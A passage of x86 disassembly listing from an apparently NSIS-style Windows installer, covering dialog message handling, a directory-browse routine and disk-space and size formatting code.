  404219:	8b d8                	mov    %eax,%ebx
  40421b:	53                   	push   %ebx
  40421c:	e8 1d fe ff ff       	call   0x40403e
  404221:	8b 35 00 72 40 00    	mov    0x407200,%esi
  404227:	6a 00                	push   $0x0
  404229:	6a 01                	push   $0x1
  40422b:	68 5b 04 00 00       	push   $0x45b
  404230:	53                   	push   %ebx
  404231:	ff d6                	call   *%esi
  404233:	a1 14 37 42 00       	mov    0x423714,%eax
  404238:	8b 40 68             	mov    0x68(%eax),%eax
  40423b:	85 c0                	test   %eax,%eax
  40423d:	7d 09                	jge    0x404248
  40423f:	f7 d8                	neg    %eax
  404241:	50                   	push   %eax
  404242:	ff 15 98 71 40 00    	call   *0x407198
  404248:	50                   	push   %eax
  404249:	6a 00                	push   $0x0
  40424b:	68 43 04 00 00       	push   $0x443
  404250:	53                   	push   %ebx
  404251:	ff d6                	call   *%esi
  404253:	68 00 00 01 04       	push   $0x4010000
  404258:	6a 00                	push   $0x0
  40425a:	68 45 04 00 00       	push   $0x445
  40425f:	53                   	push   %ebx
  404260:	ff d6                	call   *%esi
  404262:	57                   	push   %edi
  404263:	e8 18 1d 00 00       	call   0x405f80
  404268:	33 ff                	xor    %edi,%edi
  40426a:	50                   	push   %eax
  40426b:	57                   	push   %edi
  40426c:	68 35 04 00 00       	push   $0x435
  404271:	53                   	push   %ebx
  404272:	ff d6                	call   *%esi
  404274:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404277:	89 3d d4 ec 41 00    	mov    %edi,0x41ecd4
  40427d:	50                   	push   %eax
  40427e:	ff 75 14             	push   0x14(%ebp)
  404281:	68 49 04 00 00       	push   $0x449
  404286:	53                   	push   %ebx
  404287:	ff d6                	call   *%esi
  404289:	89 3d d4 ec 41 00    	mov    %edi,0x41ecd4
  40428f:	33 c0                	xor    %eax,%eax
  404291:	e9 57 01 00 00       	jmp    0x4043ed
  404296:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40429d:	8b 1d 44 72 40 00    	mov    0x407244,%ebx
  4042a3:	8b 35 00 72 40 00    	mov    0x407200,%esi
  4042a9:	75 5a                	jne    0x404305
  4042ab:	8b 45 10             	mov    0x10(%ebp),%eax
  4042ae:	c1 e8 10             	shr    $0x10,%eax
  4042b1:	66 85 c0             	test   %ax,%ax
  4042b4:	0f 85 24 01 00 00    	jne    0x4043de
  4042ba:	33 c0                	xor    %eax,%eax
  4042bc:	39 05 d4 ec 41 00    	cmp    %eax,0x41ecd4
  4042c2:	0f 85 16 01 00 00    	jne    0x4043de
  4042c8:	8b 0d e0 f4 41 00    	mov    0x41f4e0,%ecx
  4042ce:	8d 79 14             	lea    0x14(%ecx),%edi
  4042d1:	f6 07 20             	testb  $0x20,(%edi)
  4042d4:	0f 84 04 01 00 00    	je     0x4043de
  4042da:	50                   	push   %eax
  4042db:	50                   	push   %eax
  4042dc:	68 f0 00 00 00       	push   $0xf0
  4042e1:	68 0a 04 00 00       	push   $0x40a
  4042e6:	ff 75 08             	push   0x8(%ebp)
  4042e9:	ff d3                	call   *%ebx
  4042eb:	50                   	push   %eax
  4042ec:	ff d6                	call   *%esi
  4042ee:	8b 0f                	mov    (%edi),%ecx
  4042f0:	83 e0 01             	and    $0x1,%eax
  4042f3:	83 e1 fe             	and    $0xfffffffe,%ecx
  4042f6:	50                   	push   %eax
  4042f7:	0b c8                	or     %eax,%ecx
  4042f9:	89 0f                	mov    %ecx,(%edi)
  4042fb:	e8 2b fd ff ff       	call   0x40402b
  404300:	e8 ef 00 00 00       	call   0x4043f4
  404305:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404309:	0f 85 c0 00 00 00    	jne    0x4043cf
  40430f:	68 e8 03 00 00       	push   $0x3e8
  404314:	ff 75 08             	push   0x8(%ebp)
  404317:	ff d3                	call   *%ebx
  404319:	8b 7d 14             	mov    0x14(%ebp),%edi
  40431c:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  404323:	75 68                	jne    0x40438d
  404325:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  40432c:	75 5f                	jne    0x40438d
  40432e:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  404331:	8b 57 18             	mov    0x18(%edi),%edx
  404334:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  404337:	2b ca                	sub    %edx,%ecx
  404339:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  40433f:	89 55 f4             	mov    %edx,-0xc(%ebp)
  404342:	c7 45 fc a0 26 42 00 	movl   $0x4226a0,-0x4(%ebp)
  404349:	73 42                	jae    0x40438d
  40434b:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40434e:	51                   	push   %ecx
  40434f:	6a 00                	push   $0x0
  404351:	68 4b 04 00 00       	push   $0x44b
  404356:	50                   	push   %eax
  404357:	ff d6                	call   *%esi
  404359:	8b 3d a4 71 40 00    	mov    0x4071a4,%edi
  40435f:	68 02 7f 00 00       	push   $0x7f02
  404364:	6a 00                	push   $0x0
  404366:	ff d7                	call   *%edi
  404368:	8b 1d a0 71 40 00    	mov    0x4071a0,%ebx
  40436e:	50                   	push   %eax
  40436f:	ff d3                	call   *%ebx
  404371:	6a 01                	push   $0x1
  404373:	ff 75 fc             	push   -0x4(%ebp)
  404376:	ff 75 08             	push   0x8(%ebp)
  404379:	e8 9a 00 00 00       	call   0x404418
  40437e:	68 00 7f 00 00       	push   $0x7f00
  404383:	6a 00                	push   $0x0
  404385:	ff d7                	call   *%edi
  404387:	50                   	push   %eax
  404388:	ff d3                	call   *%ebx
  40438a:	8b 7d 14             	mov    0x14(%ebp),%edi
  40438d:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  404394:	75 4b                	jne    0x4043e1
  404396:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  40439d:	75 42                	jne    0x4043e1
  40439f:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  4043a3:	75 11                	jne    0x4043b6
  4043a5:	6a 00                	push   $0x0
  4043a7:	6a 01                	push   $0x1
  4043a9:	68 11 01 00 00       	push   $0x111
  4043ae:	ff 35 08 37 42 00    	push   0x423708
  4043b4:	ff d6                	call   *%esi
  4043b6:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  4043ba:	75 0e                	jne    0x4043ca
  4043bc:	6a 00                	push   $0x0
  4043be:	6a 00                	push   $0x0
  4043c0:	6a 10                	push   $0x10
  4043c2:	ff 35 08 37 42 00    	push   0x423708
  4043c8:	ff d6                	call   *%esi
  4043ca:	33 c0                	xor    %eax,%eax
  4043cc:	40                   	inc    %eax
  4043cd:	eb 1e                	jmp    0x4043ed
  4043cf:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4043d6:	75 06                	jne    0x4043de
  4043d8:	ff 05 d4 ec 41 00    	incl   0x41ecd4
  4043de:	8b 7d 14             	mov    0x14(%ebp),%edi
  4043e1:	57                   	push   %edi
  4043e2:	ff 75 10             	push   0x10(%ebp)
  4043e5:	ff 75 0c             	push   0xc(%ebp)
  4043e8:	e8 83 fc ff ff       	call   0x404070
  4043ed:	5f                   	pop    %edi
  4043ee:	5e                   	pop    %esi
  4043ef:	5b                   	pop    %ebx
  4043f0:	c9                   	leave
  4043f1:	c2 10 00             	ret    $0x10
  4043f4:	83 3d ac 37 42 00 00 	cmpl   $0x0,0x4237ac
  4043fb:	a1 d0 ec 41 00       	mov    0x41ecd0,%eax
  404400:	75 05                	jne    0x404407
  404402:	a1 04 fd 41 00       	mov    0x41fd04,%eax
  404407:	6a 01                	push   $0x1
  404409:	6a 01                	push   $0x1
  40440b:	68 f4 00 00 00       	push   $0xf4
  404410:	50                   	push   %eax
  404411:	ff 15 00 72 40 00    	call   *0x407200
  404417:	c3                   	ret
  404418:	55                   	push   %ebp
  404419:	8b ec                	mov    %esp,%ebp
  40441b:	83 ec 3c             	sub    $0x3c,%esp
  40441e:	8b 45 08             	mov    0x8(%ebp),%eax
  404421:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  404425:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  404429:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40442c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40442f:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  404436:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404439:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40443c:	50                   	push   %eax
  40443d:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  404444:	c7 45 d0 00 92 40 00 	movl   $0x409200,-0x30(%ebp)
  40444b:	e8 fc 11 00 00       	call   0x40564c
  404450:	c9                   	leave
  404451:	c2 0c 00             	ret    $0xc
  404454:	55                   	push   %ebp
  404455:	8b ec                	mov    %esp,%ebp
  404457:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40445e:	56                   	push   %esi
  40445f:	8b 75 14             	mov    0x14(%ebp),%esi
  404462:	75 26                	jne    0x40448a
  404464:	ff 76 30             	push   0x30(%esi)
  404467:	6a 1d                	push   $0x1d
  404469:	ff 75 08             	push   0x8(%ebp)
  40446c:	e8 98 fb ff ff       	call   0x404009
  404471:	8b 46 3c             	mov    0x3c(%esi),%eax
  404474:	c1 e0 0a             	shl    $0xa,%eax
  404477:	05 00 40 42 00       	add    $0x424000,%eax
  40447c:	50                   	push   %eax
  40447d:	68 e8 03 00 00       	push   $0x3e8
  404482:	ff 75 08             	push   0x8(%ebp)
  404485:	e8 da 11 00 00       	call   0x405664
  40448a:	56                   	push   %esi
  40448b:	ff 75 10             	push   0x10(%ebp)
  40448e:	ff 75 0c             	push   0xc(%ebp)
  404491:	e8 da fb ff ff       	call   0x404070
  404496:	5e                   	pop    %esi
  404497:	5d                   	pop    %ebp
  404498:	c2 10 00             	ret    $0x10
  40449b:	55                   	push   %ebp
  40449c:	8b ec                	mov    %esp,%ebp
  40449e:	83 ec 4c             	sub    $0x4c,%esp
  4044a1:	a1 e0 f4 41 00       	mov    0x41f4e0,%eax
  4044a6:	53                   	push   %ebx
  4044a7:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4044aa:	56                   	push   %esi
  4044ab:	8b 58 3c             	mov    0x3c(%eax),%ebx
  4044ae:	8b 40 38             	mov    0x38(%eax),%eax
  4044b1:	c1 e3 0a             	shl    $0xa,%ebx
  4044b4:	81 c3 00 40 42 00    	add    $0x424000,%ebx
  4044ba:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4044c1:	57                   	push   %edi
  4044c2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4044c5:	75 11                	jne    0x4044d8
  4044c7:	53                   	push   %ebx
  4044c8:	68 fb 03 00 00       	push   $0x3fb
  4044cd:	e8 98 11 00 00       	call   0x40566a
  4044d2:	53                   	push   %ebx
  4044d3:	e8 fc 1c 00 00       	call   0x4061d4
  4044d8:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4044df:	8b 75 08             	mov    0x8(%ebp),%esi
  4044e2:	75 6c                	jne    0x404550
  4044e4:	68 fb 03 00 00       	push   $0x3fb
  4044e9:	56                   	push   %esi
  4044ea:	ff 15 44 72 40 00    	call   *0x407244
  4044f0:	53                   	push   %ebx
  4044f1:	8b f8                	mov    %eax,%edi
  4044f3:	e8 77 14 00 00       	call   0x40596f
  4044f8:	85 c0                	test   %eax,%eax
  4044fa:	74 10                	je     0x40450c
  4044fc:	53                   	push   %ebx
  4044fd:	e8 99 14 00 00       	call   0x40599b
  404502:	85 c0                	test   %eax,%eax
  404504:	75 06                	jne    0x40450c
  404506:	53                   	push   %ebx
  404507:	e8 f6 13 00 00       	call   0x405902
  40450c:	53                   	push   %ebx
  40450d:	57                   	push   %edi
  40450e:	89 35 d8 2e 42 00    	mov    %esi,0x422ed8
  404514:	ff 15 7c 72 40 00    	call   *0x40727c
  40451a:	8b 45 14             	mov    0x14(%ebp),%eax
  40451d:	ff 70 34             	push   0x34(%eax)
  404520:	6a 01                	push   $0x1
  404522:	56                   	push   %esi
  404523:	e8 e1 fa ff ff       	call   0x404009
  404528:	8b 45 14             	mov    0x14(%ebp),%eax
  40452b:	ff 70 30             	push   0x30(%eax)
  40452e:	6a 14                	push   $0x14
  404530:	56                   	push   %esi
  404531:	e8 d3 fa ff ff       	call   0x404009
  404536:	57                   	push   %edi
  404537:	e8 02 fb ff ff       	call   0x40403e
  40453c:	6a 07                	push   $0x7
  40453e:	e8 bf 1d 00 00       	call   0x406302
  404543:	85 c0                	test   %eax,%eax
  404545:	0f 84 8c 02 00 00    	je     0x4047d7
  40454b:	6a 01                	push   $0x1
  40454d:	57                   	push   %edi
  40454e:	ff d0                	call   *%eax
  404550:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404557:	0f 85 d1 00 00 00    	jne    0x40462e
  40455d:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404561:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404566:	75 18                	jne    0x404580
  404568:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40456b:	c1 e9 10             	shr    $0x10,%ecx
  40456e:	66 81 f9 00 03       	cmp    $0x300,%cx
  404573:	0f 85 5e 02 00 00    	jne    0x4047d7
  404579:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404580:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404585:	0f 85 a3 00 00 00    	jne    0x40462e
  40458b:	6a 07                	push   $0x7
  40458d:	33 c0                	xor    %eax,%eax
  40458f:	59                   	pop    %ecx
  404590:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404593:	ff 75 f8             	push   -0x8(%ebp)
  404596:	f3 ab                	rep stos %eax,%es:(%edi)
  404598:	bf 08 fd 41 00       	mov    $0x41fd08,%edi
  40459d:	68 e0 f0 41 00       	push   $0x41f0e0
  4045a2:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  4045a5:	89 7d bc             	mov    %edi,-0x44(%ebp)
  4045a8:	c7 45 c8 ec 47 40 00 	movl   $0x4047ec,-0x38(%ebp)
  4045af:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4045b2:	e8 d5 19 00 00       	call   0x405f8c
  4045b7:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4045ba:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4045bd:	50                   	push   %eax
  4045be:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  4045c5:	ff 15 74 71 40 00    	call   *0x407174
  4045cb:	85 c0                	test   %eax,%eax
  4045cd:	74 58                	je     0x404627
  4045cf:	50                   	push   %eax
  4045d0:	ff 15 8c 72 40 00    	call   *0x40728c
  4045d6:	53                   	push   %ebx
  4045d7:	e8 26 13 00 00       	call   0x405902
  4045dc:	a1 14 37 42 00       	mov    0x423714,%eax
  4045e1:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  4045e7:	85 c0                	test   %eax,%eax
  4045e9:	74 28                	je     0x404613
  4045eb:	81 fb 00 94 42 00    	cmp    $0x429400,%ebx
  4045f1:	75 20                	jne    0x404613
  4045f3:	50                   	push   %eax
  4045f4:	6a 00                	push   $0x0
  4045f6:	e8 91 19 00 00       	call   0x405f8c
  4045fb:	57                   	push   %edi
  4045fc:	bf a0 26 42 00       	mov    $0x4226a0,%edi
  404601:	57                   	push   %edi
  404602:	ff 15 18 71 40 00    	call   *0x407118
  404608:	85 c0                	test   %eax,%eax
  40460a:	74 07                	je     0x404613
  40460c:	57                   	push   %edi
  40460d:	53                   	push   %ebx
  40460e:	e8 73 19 00 00       	call   0x405f86
  404613:	ff 05 f8 fc 41 00    	incl   0x41fcf8
  404619:	53                   	push   %ebx
  40461a:	68 fb 03 00 00       	push   $0x3fb
  40461f:	56                   	push   %esi
  404620:	e8 3f 10 00 00       	call   0x405664
  404625:	eb 07                	jmp    0x40462e
  404627:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  40462e:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404635:	74 0d                	je     0x404644
  404637:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  40463e:	0f 85 93 01 00 00    	jne    0x4047d7
  404644:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404648:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40464c:	53                   	push   %ebx
  40464d:	68 fb 03 00 00       	push   $0x3fb
  404652:	e8 13 10 00 00       	call   0x40566a
  404657:	53                   	push   %ebx
  404658:	e8 93 13 00 00       	call   0x4059f0
  40465d:	85 c0                	test   %eax,%eax
  40465f:	75 07                	jne    0x404668
  404661:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404668:	be d8 ec 41 00       	mov    $0x41ecd8,%esi
  40466d:	53                   	push   %ebx
  40466e:	56                   	push   %esi
  40466f:	e8 f6 18 00 00       	call   0x405f6a
  404674:	6a 01                	push   $0x1
  404676:	e8 87 1c 00 00       	call   0x406302
  40467b:	85 c0                	test   %eax,%eax
  40467d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404680:	74 35                	je     0x4046b7
  404682:	33 c0                	xor    %eax,%eax
  404684:	33 ff                	xor    %edi,%edi
  404686:	3b c6                	cmp    %esi,%eax
  404688:	74 2d                	je     0x4046b7
  40468a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40468d:	50                   	push   %eax
  40468e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404691:	50                   	push   %eax
  404692:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404695:	50                   	push   %eax
  404696:	56                   	push   %esi
  404697:	ff 55 f4             	call   *-0xc(%ebp)
  40469a:	85 c0                	test   %eax,%eax
  40469c:	75 71                	jne    0x40470f
  40469e:	85 ff                	test   %edi,%edi
  4046a0:	74 02                	je     0x4046a4
  4046a2:	20 07                	and    %al,(%edi)
  4046a4:	56                   	push   %esi
  4046a5:	e8 9f 12 00 00       	call   0x405949
  4046aa:	8b f8                	mov    %eax,%edi
  4046ac:	80 27 00             	andb   $0x0,(%edi)
  4046af:	4f                   	dec    %edi
  4046b0:	3b fe                	cmp    %esi,%edi
  4046b2:	c6 07 5c             	movb   $0x5c,(%edi)
  4046b5:	75 d3                	jne    0x40468a
  4046b7:	53                   	push   %ebx
  4046b8:	56                   	push   %esi
  4046b9:	e8 ac 18 00 00       	call   0x405f6a
  4046be:	56                   	push   %esi
  4046bf:	e8 d7 12 00 00       	call   0x40599b
  4046c4:	33 ff                	xor    %edi,%edi
  4046c6:	3b c7                	cmp    %edi,%eax
  4046c8:	74 03                	je     0x4046cd
  4046ca:	80 20 00             	andb   $0x0,(%eax)
  4046cd:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4046d0:	50                   	push   %eax
  4046d1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4046d4:	50                   	push   %eax
  4046d5:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4046d8:	50                   	push   %eax
  4046d9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4046dc:	50                   	push   %eax
  4046dd:	56                   	push   %esi
  4046de:	ff 15 a8 70 40 00    	call   *0x4070a8
  4046e4:	85 c0                	test   %eax,%eax
  4046e6:	74 43                	je     0x40472b
  4046e8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4046eb:	be 00 04 00 00       	mov    $0x400,%esi
  4046f0:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  4046f4:	56                   	push   %esi
  4046f5:	ff 75 f4             	push   -0xc(%ebp)
  4046f8:	50                   	push   %eax
  4046f9:	ff 15 48 71 40 00    	call   *0x407148
  4046ff:	99                   	cltd
  404700:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404703:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404706:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40470d:	eb 21                	jmp    0x404730
  40470f:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404712:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404715:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  404719:	c1 e9 0a             	shr    $0xa,%ecx
  40471c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40471f:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404722:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404729:	33 ff                	xor    %edi,%edi
  40472b:	be 00 04 00 00       	mov    $0x400,%esi
  404730:	6a 05                	push   $0x5
  404732:	e8 f8 01 00 00       	call   0x40492f
  404737:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  40473a:	74 19                	je     0x404755
  40473c:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40473f:	33 c9                	xor    %ecx,%ecx
  404741:	3b d1                	cmp    %ecx,%edx
  404743:	77 10                	ja     0x404755
  404745:	72 07                	jb     0x40474e
  404747:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40474a:	3b c8                	cmp    %eax,%ecx
  40474c:	73 07                	jae    0x404755
  40474e:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404755:	8b 0d dc 2e 42 00    	mov    0x422edc,%ecx
  40475b:	39 79 10             	cmp    %edi,0x10(%ecx)
  40475e:	74 30                	je     0x404790
  404760:	50                   	push   %eax
  404761:	6a fb                	push   $0xfffffffb
  404763:	68 ff 03 00 00       	push   $0x3ff
  404768:	e8 aa 01 00 00       	call   0x404917
  40476d:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404770:	74 10                	je     0x404782
  404772:	ff 75 d8             	push   -0x28(%ebp)
  404775:	ff 75 d4             	push   -0x2c(%ebp)
  404778:	6a fc                	push   $0xfffffffc
  40477a:	56                   	push   %esi
  40477b:	e8 d2 00 00 00       	call   0x404852
  404780:	eb 0e                	jmp    0x404790
  404782:	68 c8 ec 41 00       	push   $0x41ecc8
  404787:	56                   	push   %esi
  404788:	ff 75 08             	push   0x8(%ebp)
  40478b:	e8 d4 0e 00 00       	call   0x405664
  404790:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404793:	3b c7                	cmp    %edi,%eax
  404795:	a3 c4 37 42 00       	mov    %eax,0x4237c4
  40479a:	75 0a                	jne    0x4047a6
  40479c:	6a 07                	push   $0x7
  40479e:	e8 68 cc ff ff       	call   0x40140b
  4047a3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4047a6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4047a9:	85 70 14             	test   %esi,0x14(%eax)
  4047ac:	74 03                	je     0x4047b1
  4047ae:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4047b1:	33 c0                	xor    %eax,%eax
  4047b3:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  4047b6:	0f 94 c0             	sete   %al
  4047b9:	50                   	push   %eax
  4047ba:	e8 6c f8 ff ff       	call   0x40402b
  4047bf:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  4047c2:	75 0d                	jne    0x4047d1
  4047c4:	39 3d f8 fc 41 00    	cmp    %edi,0x41fcf8
  4047ca:	75 05                	jne    0x4047d1
  4047cc:	e8 23 fc ff ff       	call   0x4043f4
  4047d1:	89 3d f8 fc 41 00    	mov    %edi,0x41fcf8
  4047d7:	ff 75 14             	push   0x14(%ebp)
  4047da:	ff 75 10             	push   0x10(%ebp)
  4047dd:	ff 75 0c             	push   0xc(%ebp)
  4047e0:	e8 8b f8 ff ff       	call   0x404070
  4047e5:	5f                   	pop    %edi
  4047e6:	5e                   	pop    %esi
  4047e7:	5b                   	pop    %ebx
  4047e8:	c9                   	leave
  4047e9:	c2 10 00             	ret    $0x10
  4047ec:	55                   	push   %ebp
  4047ed:	8b ec                	mov    %esp,%ebp
  4047ef:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  4047f3:	56                   	push   %esi
  4047f4:	8b 35 00 72 40 00    	mov    0x407200,%esi
  4047fa:	75 1c                	jne    0x404818
  4047fc:	ff 75 14             	push   0x14(%ebp)
  4047ff:	68 fb 03 00 00       	push   $0x3fb
  404804:	e8 61 0e 00 00       	call   0x40566a
  404809:	ff 75 14             	push   0x14(%ebp)
  40480c:	6a 01                	push   $0x1
  40480e:	68 66 04 00 00       	push   $0x466
  404813:	ff 75 08             	push   0x8(%ebp)
  404816:	ff d6                	call   *%esi
  404818:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  40481c:	75 2d                	jne    0x40484b
  40481e:	ff 75 14             	push   0x14(%ebp)
  404821:	ff 75 10             	push   0x10(%ebp)
  404824:	ff 15 70 71 40 00    	call   *0x407170
  40482a:	85 c0                	test   %eax,%eax
  40482c:	74 0e                	je     0x40483c
  40482e:	6a 07                	push   $0x7
  404830:	e8 d6 cb ff ff       	call   0x40140b
  404835:	85 c0                	test   %eax,%eax
  404837:	75 03                	jne    0x40483c
  404839:	40                   	inc    %eax
  40483a:	eb 02                	jmp    0x40483e
  40483c:	33 c0                	xor    %eax,%eax
  40483e:	50                   	push   %eax
  40483f:	6a 00                	push   $0x0
  404841:	68 65 04 00 00       	push   $0x465
  404846:	ff 75 08             	push   0x8(%ebp)
  404849:	ff d6                	call   *%esi
  40484b:	33 c0                	xor    %eax,%eax
  40484d:	5e                   	pop    %esi
  40484e:	5d                   	pop    %ebp
  40484f:	c2 10 00             	ret    $0x10
  404852:	55                   	push   %ebp
  404853:	8b ec                	mov    %esp,%ebp
  404855:	83 ec 40             	sub    $0x40,%esp
  404858:	8b 45 14             	mov    0x14(%ebp),%eax
  40485b:	53                   	push   %ebx
  40485c:	56                   	push   %esi
  40485d:	8b 75 10             	mov    0x10(%ebp),%esi
  404860:	57                   	push   %edi
  404861:	6a dc                	push   $0xffffffdc
  404863:	85 c0                	test   %eax,%eax
  404865:	5b                   	pop    %ebx
  404866:	74 0b                	je     0x404873
  404868:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  40486c:	c1 e8 14             	shr    $0x14,%eax
  40486f:	33 ff                	xor    %edi,%edi
  404871:	eb 4e                	jmp    0x4048c1
  404873:	6a 14                	push   $0x14
  404875:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  40487b:	59                   	pop    %ecx
  40487c:	8b c6                	mov    %esi,%eax
  40487e:	73 06                	jae    0x404886
  404880:	6a 0a                	push   $0xa
  404882:	59                   	pop    %ecx
  404883:	6a dd                	push   $0xffffffdd
  404885:	5b                   	pop    %ebx
  404886:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  40488c:	73 05                	jae    0x404893
  40488e:	6a de                	push   $0xffffffde
  404890:	33 c9                	xor    %ecx,%ecx
  404892:	5b                   	pop    %ebx
  404893:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404899:	73 0d                	jae    0x4048a8
  40489b:	33 c0                	xor    %eax,%eax
  40489d:	6a 14                	push   $0x14
  40489f:	40                   	inc    %eax
  4048a0:	5f                   	pop    %edi
  4048a1:	d3 e0                	shl    %cl,%eax
  4048a3:	99                   	cltd
  4048a4:	f7 ff                	idiv   %edi
  4048a6:	03 c6                	add    %esi,%eax
  4048a8:	8b f0                	mov    %eax,%esi
  4048aa:	25 ff ff ff 00       	and    $0xffffff,%eax
  4048af:	6a 0a                	push   $0xa
  4048b1:	33 d2                	xor    %edx,%edx
  4048b3:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4048b6:	03 c0                	add    %eax,%eax
  4048b8:	d3 e8                	shr    %cl,%eax
  4048ba:	d3 ee                	shr    %cl,%esi
  4048bc:	59                   	pop    %ecx
  4048bd:	f7 f1                	div    %ecx
  4048bf:	8b fa                	mov    %edx,%edi
  4048c1:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4048c4:	6a df                	push   $0xffffffdf
  4048c6:	50                   	push   %eax
  4048c7:	e8 c0 16 00 00       	call   0x405f8c
  4048cc:	50                   	push   %eax
  4048cd:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4048d0:	53                   	push   %ebx
  4048d1:	50                   	push   %eax
  4048d2:	e8 b5 16 00 00       	call   0x405f8c
  4048d7:	50                   	push   %eax
  4048d8:	57                   	push   %edi
  4048d9:	56                   	push   %esi
  4048da:	68 08 92 40 00       	push   $0x409208
  4048df:	ff 75 0c             	push   0xc(%ebp)
  4048e2:	be 08 fd 41 00       	mov    $0x41fd08,%esi
  4048e7:	56                   	push   %esi
  4048e8:	e8 9f 16 00 00       	call   0x405f8c
  4048ed:	56                   	push   %esi
  4048ee:	8b f8                	mov    %eax,%edi
  4048f0:	e8 8b 16 00 00       	call   0x405f80
  4048f5:	03 f8                	add    %eax,%edi
  4048f7:	57                   	push   %edi
  4048f8:	ff 15 74 72 40 00    	call   *0x407274
  4048fe:	83 c4 18             	add    $0x18,%esp
  404901:	56                   	push   %esi
  404902:	ff 75 08             	push   0x8(%ebp)
  404905:	ff 35 d8 2e 42 00    	push   0x422ed8
  40490b:	e8 54 0d 00 00       	call   0x405664
  404910:	5f                   	pop    %edi
  404911:	5e                   	pop    %esi
  404912:	5b                   	pop    %ebx
  404913:	c9                   	leave
  404914:	c2 10 00             	ret    $0x10
  404917:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40491b:	33 c9                	xor    %ecx,%ecx
  40491d:	51                   	push   %ecx
  40491e:	50                   	push   %eax
  40491f:	ff 74 24 10          	push   0x10(%esp)
  404923:	ff 74 24 10          	push   0x10(%esp)
  404927:	e8 26 ff ff ff       	call   0x404852
  40492c:	c2 0c 00             	ret    $0xc
  40492f:	8b 15 4c 37 42 00    	mov    0x42374c,%edx
